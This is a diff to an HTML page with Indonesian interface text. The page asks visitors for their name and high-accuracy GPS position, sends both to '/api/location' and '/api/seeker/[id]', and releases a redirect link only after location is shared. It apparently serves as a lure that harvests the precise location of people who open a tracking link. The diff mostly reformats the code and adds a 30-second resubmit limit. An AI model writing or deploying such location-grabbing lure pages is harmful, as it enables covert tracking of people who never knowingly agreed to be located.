@@ -46,65 +46,73 @@
   <h5>©Admin</h5>
 
   <script>
-    const id = new URLSearchParams(window.location.search).get("id");
+  const id = new URLSearchParams(window.location.search).get("id");
+  const audio = document.getElementById('audio');
+  let lastSubmitTime = 0;
 
-    const audio = document.getElementById('audio');
+  function startAudioOnce() {
+    audio.muted = false;
+    audio.play().catch(err => console.warn("Audio gagal diputar:", err));
+    document.removeEventListener('click', startAudioOnce);
+    document.removeEventListener('touchstart', startAudioOnce);
+  }
+  document.addEventListener('click', startAudioOnce);
+  document.addEventListener('touchstart', startAudioOnce);
 
-    // Unmute dan mainkan saat interaksi pertama
-    function startAudioOnce() {
-      audio.muted = false;
-      audio.play().catch(err => console.warn("Audio gagal diputar:", err));
-      document.removeEventListener('click', startAudioOnce);
-      document.removeEventListener('touchstart', startAudioOnce);
+  function submitData() {
+    const now = Date.now();
+    const selisih = Math.floor((now - lastSubmitTime) / 1000);
+    if (selisih < 30) {
+      alert(`Harap tunggu ${30 - selisih} detik sebelum mencoba lagi.`);
+      return;
     }
-    document.addEventListener('click', startAudioOnce);
-    document.addEventListener('touchstart', startAudioOnce);
 
-    function submitData() {
-      const nama = document.getElementById("nama").value.trim();
-      if (!nama) return alert("Nama wajib diisi.");
-      if (!id) return alert("ID dokumen tidak ditemukan.");
+    const nama = document.getElementById("nama").value.trim();
+    if (!nama) return alert("Nama wajib diisi.");
+    if (!id) return alert("ID dokumen tidak ditemukan.");
 
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            const body = {
-              nama,
-              lat: pos.coords.latitude,
-              lon: pos.coords.longitude,
-              acc: pos.coords.accuracy,
-              timestamp: new Date().toISOString()
-            };
+    lastSubmitTime = now; // Set waktu terakhir submit
 
-            // Kirim ke /api/location
-            fetch("/api/location", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify(body),
-            }).catch((e) => console.warn("Lokasi gagal dikirim:", e));
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const body = {
+            nama,
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            acc: pos.coords.accuracy,
+            timestamp: new Date().toISOString()
+          };
 
-            // Kirim ke /api/seeker/[id]
-            fetch(`/api/seeker/${id}`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify(body),
-            })
-              .then((res) => res.json())
-              .then((data) => {
-                if (data.redirectTo) {
-                  window.location.href = data.redirectTo;
-                } else {
-                  alert("Link tidak ditemukan.");
-                }
-              });
-          },
-          (err) => alert("Izin lokasi diperlukan. Aktifkan GPS dan izinkan akses."),
-          { enableHighAccuracy: true, timeout: 20000 }
-        );
-      } else {
-        alert("Browser tidak mendukung geolokasi.");
-      }
+          // Kirim ke /api/location
+          fetch("/api/location", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(body),
+          }).catch((e) => console.warn("Lokasi gagal dikirim:", e));
+
+          // Kirim ke /api/seeker/[id]
+          fetch(`/api/seeker/${id}`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(body),
+          })
+          .then((res) => res.json())
+          .then((data) => {
+            if (data.redirectTo) {
+              window.location.href = data.redirectTo;
+            } else {
+              alert("Link tidak ditemukan.");
+            }
+          });
+        },
+        (err) => alert("Izin lokasi diperlukan. Aktifkan GPS dan izinkan akses."),
+        { enableHighAccuracy: true, timeout: 30000 }
+      );
+    } else {
+      alert("Browser tidak mendukung geolokasi.");
     }
-  </script>
+  }
+</script>
 </body>
 </html>
